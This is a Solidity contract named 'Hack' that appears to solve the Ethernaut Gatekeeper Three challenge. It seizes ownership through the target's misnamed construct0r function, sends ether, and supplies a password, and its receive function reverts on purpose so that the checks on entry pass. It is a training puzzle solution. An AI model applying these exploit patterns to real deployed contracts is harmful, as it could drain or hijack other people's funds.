// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IGatekeeperThree {
    function enter() external returns (bool entered);

    function construct0r() external;

    function getAllowance(uint _password) external;

    function createTrick() external;
}

error Hack__TransferFailed();
error Hack__YouDontSendAny();

contract Hack {
    IGatekeeperThree private immutable gate;

    constructor(address contractAddress) {
        gate = IGatekeeperThree(contractAddress);
    }

    function phaseOne() public payable {
        gate.createTrick();
        (bool success, ) = address(gate).call{value: msg.value}("");
        if (!success) {
            revert Hack__TransferFailed();
        }
        gate.construct0r();
    }

    function phaseTwo(uint _password) public {
        gate.getAllowance(_password);
        gate.enter();
    }

    receive() external payable {
        revert Hack__YouDontSendAny();
    }
}
